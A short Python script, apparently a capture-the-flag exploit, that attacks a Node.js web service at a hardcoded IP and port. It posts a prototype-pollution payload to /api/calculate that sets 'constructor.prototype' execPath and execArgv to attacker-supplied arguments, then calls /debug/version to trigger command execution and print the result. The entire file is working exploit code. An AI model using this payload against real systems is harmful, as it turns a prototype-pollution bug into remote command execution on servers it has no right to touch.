import json
import requests
import sys
from collections import OrderedDict
url = 'http://167.99.95.121:{}'.format(32504)
def post_calculate(obj):
    return requests.session().post('{}/api/calculate'.format(url), json=obj)
def get_version():
    return requests.session().get('{}/debug/version'.format(url))
if len(sys.argv) > 1:
    pollution = {
        "constructor": {
            "prototype": OrderedDict([
                ("execPath", sys.argv[1]),
                ("execArgv", sys.argv[2:])
            ])
        }
    }
    post_calculate(pollution)
    print get_version().text
